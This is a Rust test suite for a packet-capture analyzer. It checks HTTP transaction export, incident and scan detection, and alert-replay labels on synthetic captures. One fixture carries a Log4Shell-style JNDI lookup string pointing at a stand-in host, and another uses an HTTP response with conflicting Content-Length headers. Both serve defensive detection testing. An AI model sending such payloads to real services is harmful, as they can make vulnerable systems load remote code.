#[path = "support/http2.rs"]
mod http2;
#[path = "support/http.rs"]
mod support;
#[path = "support/critical.rs"]
mod critical;
#[path = "headless_analysis/evicted_http.rs"]
mod evicted_http;

use packrat_tui::{export::pcapng::PcapNgWriter, net::packet::CaptureMetadata};
use serde_json::Value;
use std::{
    path::Path,
    process::{Command, Output},
};

fn run(path: &Path) -> Output {
    run_with(path, &[])
}

fn run_with(path: &Path, options: &[&str]) -> Output {
    Command::new(env!("CARGO_BIN_EXE_packrat-analyze"))
        .args(options)
        .arg(path)
        .env_remove("TERM")
        .env("HOME", "/nonexistent")
        .output()
        .unwrap()
}

fn read_events(output: &Output) -> Vec<Value> {
    String::from_utf8(output.stdout.clone())
        .unwrap()
        .lines()
        .map(|line| serde_json::from_str(line).unwrap())
        .collect()
}

fn events(output: &Output) -> Vec<Value> {
    assert!(
        output.status.success(),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );
    read_events(output)
}

#[test]
fn capture_to_transactions_runs_without_a_terminal_or_user_config() {
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().join("exchange.pcapng");
    let mut writer = PcapNgWriter::create(&path).unwrap();
    writer
        .write_packet(&support::tcp(1, 100, 0x02, &[], false))
        .unwrap();
    writer
        .write_packet(&support::tcp(
            2,
            101,
            0x18,
            b"GET /headless HTTP/1.1\r\nHost: example\r\n\r\n",
            false,
        ))
        .unwrap();
    writer
        .write_packet(&support::tcp(
            3,
            500,
            0x18,
            b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok",
            true,
        ))
        .unwrap();
    writer.flush().unwrap();
    let events = events(&run(&path));
    let conversation = events
        .iter()
        .find(|value| value["type"] == "http_conversation")
        .unwrap();
    let transaction = &conversation["conversation"]["transactions"][0];
    assert_eq!(transaction["request"]["target"], "/headless");
    assert_eq!(
        transaction["request"]["packet_numbers"],
        serde_json::json!([2])
    );
    assert_eq!(transaction["response"]["status"], 200);
    let summary = events.last().unwrap();
    assert_eq!(summary["type"], "summary");
    assert_eq!(summary["packets"], 3);
    assert_eq!(summary["analyzed"], 3);
    assert_eq!(summary["http_exchanges"], 1);
    assert_eq!(summary["containment"], "disabled");
    assert_eq!(summary["transaction_scope"], "tcp_evicted_and_retained");
    assert_eq!(summary["http3_transaction_scope"], "retained_connections_only");
}

#[test]
fn cleartext_http2_capture_is_exported_as_multiplexed_exchanges() {
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().join("http2.pcapng");
    let stream = http2::stream(
        &http2::frame(1, 5, 1, &http2::request(b"/h2")),
        &http2::frame(1, 5, 1, &[0x88]),
    );
    let mut writer = PcapNgWriter::create(&path).unwrap();
    writer
        .write_packet(&support::tcp(1, 100, 0x18, &stream.client_data, false))
        .unwrap();
    writer
        .write_packet(&support::tcp(2, 500, 0x18, &stream.server_data, true))
        .unwrap();
    writer.flush().unwrap();
    let events = events(&run(&path));
    let event = events
        .iter()
        .find(|event| event["type"] == "http2_conversation")
        .unwrap();
    let transaction = &event["conversation"]["transactions"][0];
    assert_eq!(transaction["stream_id"], 1);
    assert_eq!(transaction["response"]["state"], "Complete");
    assert_eq!(
        transaction["request"]["packet_numbers"],
        serde_json::json!([1])
    );
    assert_eq!(events.last().unwrap()["http2_exchanges"], 1);
}

#[test]
fn critical_detection_is_reported_without_enforcement() {
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().join("incident.pcapng");
    let mut writer = PcapNgWriter::create(&path).unwrap();
    writer
        .write_packet(&critical::http_framing_ambiguity(1))
        .unwrap();
    writer.flush().unwrap();
    let events = events(&run(&path));
    assert!(events.iter().any(|value| value["type"] == "incident"));
    assert!(events.last().unwrap()["incidents"].as_u64().unwrap() > 0);
    assert_eq!(events.last().unwrap()["containment"], "disabled");
}

#[test]
fn unsupported_link_types_are_reported_not_silently_analyzed() {
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().join("unsupported.pcapng");
    let mut packet = support::tcp(1, 100, 0x18, b"${jndi:ldap://evil/x}", false);
    packet.capture = Some(CaptureMetadata {
        timestamp: Some(packrat_tui::net::packet::CaptureTimestamp {
            ticks: 1,
            resolution: packrat_tui::net::packet::TimestampResolution::Decimal(0),
            offset_seconds: 0,
        }),
        captured_length: packet.bytes.len() as u32,
        wire_length: packet.bytes.len() as u32,
        link_type: 101,
        interface_id: 0,
        section_id: 0,
        interface_name: None,
        comments: vec![],
    });
    let mut writer = PcapNgWriter::create(&path).unwrap();
    writer.write_packet(&packet).unwrap();
    writer.flush().unwrap();
    let events = events(&run(&path));
    assert_eq!(events[0]["type"], "skipped_packet");
    assert_eq!(events[0]["reason"]["UnsupportedLinkType"], 101);
    assert_eq!(events.last().unwrap()["skipped"], 1);
    assert_eq!(events.last().unwrap()["incidents"], 0);
    let replay = run_with(&path, &["--expect-alert-frame", "scan.horizontal=1"]);
    assert!(!replay.status.success());
    assert_eq!(read_events(&replay).last().unwrap()["alert_expectations"]["verdict"], "inconclusive");
    let replay = run_with(&path, &["--allow-truncated", "--expect-alert", "scan.horizontal=0"]);
    assert!(!replay.status.success());
    assert_eq!(read_events(&replay).last().unwrap()["alert_expectations"]["verdict"], "inconclusive");
}

#[test]
fn truncated_frames_cannot_satisfy_replay_labels_without_explicit_opt_in() {
    use packrat_tui::net::packet::{CaptureTimestamp, TimestampResolution};
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().join("truncated.pcapng");
    let mut packet = support::tcp(1, 100, 0x10, b"sample bytes", false);
    let wire_length = packet.bytes.len() as u32;
    packet.bytes.truncate(54);
    packet.capture = Some(CaptureMetadata {
        timestamp: Some(CaptureTimestamp { ticks: 1, resolution: TimestampResolution::Decimal(0), offset_seconds: 0 }),
        captured_length: packet.bytes.len() as u32,
        wire_length,
        link_type: 1,
        interface_id: 0,
        section_id: 0,
        interface_name: None,
        comments: vec![],
    });
    let mut writer = PcapNgWriter::create(&path).unwrap();
    writer.write_packet(&packet).unwrap();
    writer.flush().unwrap();
    let output = run(&path);
    assert_eq!(events(&output).last().unwrap()["truncated_frames"], 1);

    let output = run_with(&path, &["--expect-alert", "scan.horizontal=0"]);
    assert!(!output.status.success());
    let summary = &read_events(&output)[0];
    assert_eq!(summary["truncated_frames"], 1);
    assert_eq!(summary["skipped"], 0);
    assert_eq!(summary["alert_expectations"]["verdict"], "inconclusive");

    let output = run_with(&path, &["--allow-truncated", "--expect-alert", "scan.horizontal=0"]);
    let summary = &events(&output)[0];
    assert_eq!(summary["allow_truncated"], true);
    assert_eq!(summary["truncated_frames"], 1);
    assert_eq!(summary["alert_expectations"]["verdict"], "passed");
}

#[test]
fn malformed_capture_and_extra_arguments_fail_without_a_success_summary() {
    let file = tempfile::NamedTempFile::new().unwrap();
    std::fs::write(file.path(), b"not a pcap file").unwrap();
    let output = run(file.path());
    assert!(!output.status.success());
    assert!(!String::from_utf8_lossy(&output.stdout).contains("summary"));
    let output = Command::new(env!("CARGO_BIN_EXE_packrat-analyze"))
        .args(["x", "--contain"])
        .output()
        .unwrap();
    assert!(!output.status.success());
    assert!(String::from_utf8_lossy(&output.stderr).contains("Unknown option: --contain"));
}

#[test]
fn labeled_http_replay_distinguishes_retransmissions_from_distinct_responses() {
    let directory = tempfile::tempdir().unwrap();
    let benign = directory.path().join("benign.pcapng");
    let suspicious = directory.path().join("auth-bursts.pcapng");
    let response = b"HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\n\r\n";
    let mut writer = PcapNgWriter::create(&benign).unwrap();
    for no in 1..=5 {
        writer.write_packet(&support::tcp(no, 100, 0x18, response, true)).unwrap();
    }
    writer.flush().unwrap();
    let benign_run = run_with(&benign, &["--expect-alert", "http.unauthorized_burst=0"]);
    assert_eq!(events(&benign_run).last().unwrap()["alert_expectations"]["verdict"], "passed");

    let mut writer = PcapNgWriter::create(&suspicious).unwrap();
    for no in (1..=5).chain(40..=44) {
        writer.write_packet(&support::tcp(no, no as u32 * 100, 0x18, response, true)).unwrap();
    }
    writer.flush().unwrap();
    let options = ["--expect-alert", "http.unauthorized_burst=2", "--expect-alert", "scan.horizontal=0"];
    let first = run_with(&suspicious, &options);
    let second = run_with(&suspicious, &options);
    assert_eq!(first.stdout, second.stdout);
    let replay_events = events(&first);
    let auth: Vec<_> = replay_events.iter()
        .filter(|e| e["alert"]["provenance"]["rule_id"] == "http.unauthorized_burst")
        .collect();
    assert_eq!(auth.len(), 2);
    assert_eq!(auth[0]["alert"]["packet_refs"], serde_json::json!([1, 2, 3, 4, 5]));
    assert_ne!(auth[1]["alert"]["id"], auth[0]["alert"]["id"]);
    assert_eq!(auth[1]["alert"]["hit_count"], 1);
    assert_eq!(auth[1]["alert"]["packet_refs"], serde_json::json!([6, 7, 8, 9, 10]));
    let summary = replay_events.last().unwrap();
    assert_eq!(summary["rule_counts"]["http.unauthorized_burst"], 2);
    assert_eq!(summary["alert_expectations"]["verdict"], "passed");

    let frame = run_with(&suspicious, &[
        "--expect-alert-frame", "http.unauthorized_burst=5",
        "--expect-alert-frame", "http.unauthorized_burst=10",
    ]);
    let frame_events = events(&frame);
    let report = &frame_events.last().unwrap()["alert_expectations"];
    assert_eq!(report["verdict"], "passed");
    assert_eq!(report["frame_checks"][0]["expected_frames"], serde_json::json!([5, 10]));
    assert_eq!(report["frame_checks"][0]["unexpected_openings"], 0);

    // A label with the correct count but the wrong opening frame still fails.
    let wrong_frame = run_with(&suspicious, &[
        "--expect-alert", "http.unauthorized_burst=2",
        "--expect-alert-frame", "http.unauthorized_burst=4",
        "--expect-alert-frame", "http.unauthorized_burst=10",
    ]);
    assert!(!wrong_frame.status.success());
    let wrong_frame_events = read_events(&wrong_frame);
    let report = &wrong_frame_events.last().unwrap()["alert_expectations"];
    assert_eq!(report["verdict"], "failed");
    assert_eq!(report["checks"][0]["observed"], 2);
    assert_eq!(report["frame_checks"][0]["missing_frames"], serde_json::json!([4]));
    assert_eq!(report["frame_checks"][0]["unexpected_openings"], 1);

    for (labels, error) in [
        (vec!["--expect-alert-frame", "http.unauthorized_burst=0"], "Invalid expected alert frame"),
        (vec!["--expect-alert-frame", "http.unauthorized_burst=5",
              "--expect-alert-frame", "http.unauthorized_burst=5"], "Duplicate alert frame expectation"),
    ] {
        let invalid = run_with(&suspicious, &labels);
        assert!(!invalid.status.success());
        assert!(String::from_utf8_lossy(&invalid.stderr).contains(error));
    }

    let mismatch = run_with(&suspicious, &["--expect-alert", "http.unauthorized_burst=0"]);
    assert!(!mismatch.status.success());
    assert_eq!(read_events(&mismatch).last().unwrap()["alert_expectations"]["verdict"], "failed");
    let typo = run_with(&suspicious, &["--expect-alert", "http.unregistered=0"]);
    assert!(!typo.status.success());
    assert!(String::from_utf8_lossy(&typo.stderr).contains("Unknown alert rule ID"));
}

#[test]
fn http_burst_replay_counts_reordered_responses_only_within_the_active_window() {
    let directory = tempfile::tempdir().unwrap();
    let response = b"HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\n\r\n";
    for (label, times, count) in [
        ("reordered", [100.0, 102.0, 101.0, 103.0, 104.0], 1),
        ("too-old", [100.0, 102.0, 70.0, 103.0, 104.0], 0),
    ] {
        let path = directory.path().join(format!("{label}.pcapng"));
        let mut writer = PcapNgWriter::create(&path).unwrap();
        for (index, timestamp) in times.into_iter().enumerate() {
            let frame = index as u64 + 1;
            let mut packet = support::tcp(frame, frame as u32 * 100, 0x18, response, true);
            packet.timestamp = timestamp;
            writer.write_packet(&packet).unwrap();
        }
        writer.flush().unwrap();

        let expected = format!("http.unauthorized_burst={count}");
        let replay = run_with(&path, &["--expect-alert", &expected]);
        let rows = events(&replay);
        assert_eq!(rows.last().unwrap()["alert_expectations"]["verdict"], "passed");
        if count == 1 {
            let alert = rows.iter().find(|row| row["type"] == "alert").unwrap();
            assert_eq!(alert["alert"]["packet_refs"], serde_json::json!([1, 2, 3, 4, 5]));
        }
    }
}

#[test]
fn http_burst_replay_keeps_sustained_traffic_grouped_and_records_a_renewed_burst() {
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().join("renewed-auth-burst.pcapng");
    let response = b"HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\n\r\n";
    let mut writer = PcapNgWriter::create(&path).unwrap();
    for (index, timestamp) in [10.0, 10.1, 20.0, 20.1, 20.2, 42.0, 42.1, 58.0, 72.2, 72.3, 72.4, 72.5]
        .into_iter().enumerate()
    {
        let frame = index as u64 + 1;
        let mut packet = support::tcp(frame, frame as u32 * 100, 0x18, response, true);
        packet.timestamp = timestamp;
        writer.write_packet(&packet).unwrap();
    }
    writer.flush().unwrap();

    let output = run_with(&path, &["--expect-alert", "http.unauthorized_burst=2"]);
    let rows = events(&output);
    let auth: Vec<_> = rows.iter()
        .filter(|row| row["alert"]["provenance"]["rule_id"] == "http.unauthorized_burst")
        .map(|row| &row["alert"])
        .collect();
    assert_eq!(auth.len(), 2);
    assert_eq!(auth[0]["packet_refs"], serde_json::json!([1, 2, 3, 4, 5]));
    assert_ne!(auth[1]["id"], auth[0]["id"]);
    assert_eq!(auth[1]["hit_count"], 1);
    assert_eq!(auth[1]["packet_refs"], serde_json::json!([8, 9, 10, 11, 12]));
}

#[test]
fn http_burst_links_complete_and_anchored_sampled_exchanges() {
    let directory = tempfile::tempdir().unwrap();
    let request = b"GET /status HTTP/1.1\r\nHost: example.test\r\n\r\n";
    let response = b"HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\n\r\n";
    let partial_body = b"HTTP/1.1 401 Unauthorized\r\nContent-Length: 20\r\n\r\npartial";
    let ambiguous = b"HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\nContent-Length: 20\r\n\r\n";
    for (label, anchored, complete, tail_reply, expected_links) in [
        ("complete", true, true, response.as_slice(), 5),
        ("midstream", false, true, response.as_slice(), 0),
        ("incomplete-request", true, false, response.as_slice(), 4),
        ("partial-response-body", true, true, partial_body.as_slice(), 5),
        ("ambiguous-response", true, true, ambiguous.as_slice(), 4),
    ] {
        let path = directory.path().join(format!("auth-exchange-{label}.pcapng"));
        let mut writer = PcapNgWriter::create(&path).unwrap();
        if anchored {
            writer.write_packet(&support::tcp(1, 100, 0x02, &[], false)).unwrap();
            writer.write_packet(&support::tcp(2, 500, 0x12, &[], true)).unwrap();
        }
        let start = if anchored { 3 } else { 1 };
        for index in 0..5 {
            let frame = start + index * 2;
            let request_seq = 101 + index as u32 * request.len() as u32;
            let reply_seq = 501 + index as u32 * response.len() as u32;
            let observed = if index == 4 && !complete { &request[..request.len() - 4] } else { request };
            writer.write_packet(&support::tcp(frame, request_seq, 0x18, observed, false)).unwrap();
            let reply = if index == 4 { tail_reply } else { response };
            writer.write_packet(&support::tcp(frame + 1, reply_seq, 0x18, reply, true)).unwrap();
        }
        writer.flush().unwrap();

        let output = run_with(&path, &["--expect-alert", "http.unauthorized_burst=1"]);
        let rows = events(&output);
        let alert = &rows.iter().find(|row| row["alert"]["provenance"]["rule_id"] == "http.unauthorized_burst")
            .unwrap()["alert"];
        let (expected, linked) = if expected_links == 5 {
            (serde_json::json!([4, 6, 8, 10, 12, 11, 9, 7, 5, 3]), 5)
        } else if anchored {
            (serde_json::json!([4, 6, 8, 10, 12, 9, 7, 5, 3]), 4)
        } else {
            (serde_json::json!([2, 4, 6, 8, 10]), 0)
        };
        assert_eq!(alert["packet_refs"], expected);
        assert!(alert["detail"].as_str().unwrap().contains(&format!("for {linked}/5 sampled 401 replies")));
    }
}

#[test]
fn http_burst_matches_requests_across_distinct_client_ports_without_guessing() {
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().join("several-connections.pcapng");
    let request = b"GET /status HTTP/1.1\r\nHost: example.test\r\n\r\n";
    let response = b"HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\n\r\n";
    let response_with_body = b"HTTP/1.1 401 Unauthorized\r\nContent-Length: 4\r\n\r\n";
    let mut writer = PcapNgWriter::create(&path).unwrap();
    let mut frame = 0;
    for client in 0..5_u16 {
        let mut write = |seq, flags, body, reverse| {
            frame += 1;
            let mut packet = support::tcp(frame, seq, flags, body, reverse);
            let port = 40000 + client;
            let offset = if reverse { 36 } else { 34 };
            packet.bytes[offset..offset + 2].copy_from_slice(&port.to_be_bytes());
            writer.write_packet(&packet).unwrap();
        };
        if client != 2 {
            write(100, 0x02, &[], false);
            write(500, 0x12, &[], true);
        }
        write(101, 0x18, request, false);
        if client == 0 {
            write(501, 0x18, response_with_body, true);
            write(501 + response_with_body.len() as u32, 0x18, b"done", true);
        } else {
            write(501, 0x18, response, true);
        }
    }
    writer.flush().unwrap();
    let rows = events(&run_with(&path, &["--expect-alert", "http.unauthorized_burst=1"]));
    let alert = &rows.iter().find(|row| row["alert"]["provenance"]["rule_id"] == "http.unauthorized_burst")
        .unwrap()["alert"];
    assert_eq!(alert["packet_refs"], serde_json::json!([4, 9, 11, 15, 19, 18, 14, 8, 3]));
    assert!(alert["detail"].as_str().unwrap().contains("for 4/5 sampled 401 replies"));
}

#[test]
fn labeled_scan_replay_differentiates_unique_targets_from_repeat_traffic() {
    let directory = tempfile::tempdir().unwrap();
    for (label, diverse) in [("repeated", false), ("fanout", true)] {
        let path = directory.path().join(format!("{label}.pcapng"));
        let mut writer = PcapNgWriter::create(&path).unwrap();
        for no in 1..=12 {
            let mut packet = support::tcp(no, no as u32 * 100, 0x02, &[], false);
            packet.bytes[33] = if diverse { no as u8 + 10 } else { 2 };
            writer.write_packet(&packet).unwrap();
        }
        writer.flush().unwrap();
        let expected = if diverse { "scan.horizontal=1" } else { "scan.horizontal=0" };
        let replay = run_with(&path, &["--expect-alert", expected]);
        assert_eq!(events(&replay).last().unwrap()["alert_expectations"]["verdict"], "passed");
    }
}
